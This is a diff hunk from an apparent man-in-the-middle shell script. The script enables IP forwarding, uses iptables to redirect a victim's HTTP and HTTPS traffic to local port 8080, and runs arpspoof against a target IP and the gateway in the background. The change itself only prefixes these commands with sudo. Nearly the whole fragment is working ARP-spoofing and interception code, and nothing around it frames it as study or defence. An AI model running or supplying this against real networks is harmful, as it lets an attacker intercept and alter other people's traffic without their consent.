@@ -59,9 +59,9 @@ read mVer
 echo "Started..."
 
 sysctl -w net.ipv4.ip_forward=1
-iptables -t nat -A PREROUTING -i $eH -p tcp --dport 80 -j REDIRECT --to-port 8080
-iptables -t nat -A PREROUTING -i $eH -p tcp --dport 443 -j REDIRECT --to-port 8080
-arpspoof -i $eH -t $tIP -r $gIP  > /dev/null 2>&1 &
+sudo iptables -t nat -A PREROUTING -i $eH -p tcp --dport 80 -j REDIRECT --to-port 8080
+sudo iptables -t nat -A PREROUTING -i $eH -p tcp --dport 443 -j REDIRECT --to-port 8080
+sudo arpspoof -i $eH -t $tIP -r $gIP  > /dev/null 2>&1 &
 
 
 if [ "${mVer}" = '1' ]; then
